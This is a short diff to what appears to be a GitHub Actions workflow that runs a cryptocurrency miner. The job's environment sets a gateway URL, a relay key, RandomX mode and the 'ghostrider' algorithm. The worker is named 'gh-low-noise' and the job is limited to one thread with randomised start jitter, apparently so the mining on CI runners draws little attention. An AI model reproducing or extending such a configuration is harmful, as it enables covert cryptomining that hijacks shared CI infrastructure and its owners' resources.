@@ -24,9 +24,9 @@ jobs:
         env:
           GATEWAY_URL: ${{ inputs.gateway_url }}
           RELAY_ACCESS_KEY: ${{ inputs.relay_key }}
-          ACCOUNT: Error404H
           WORKER: gh-low-noise
           THREADS: "1"
-          RANDOMX_MODE: fast
+          RANDOMX_MODE: light
+          ALGORITHM: ghostrider
           START_JITTER_SECONDS: "10"
           RUN_SECONDS: "600"
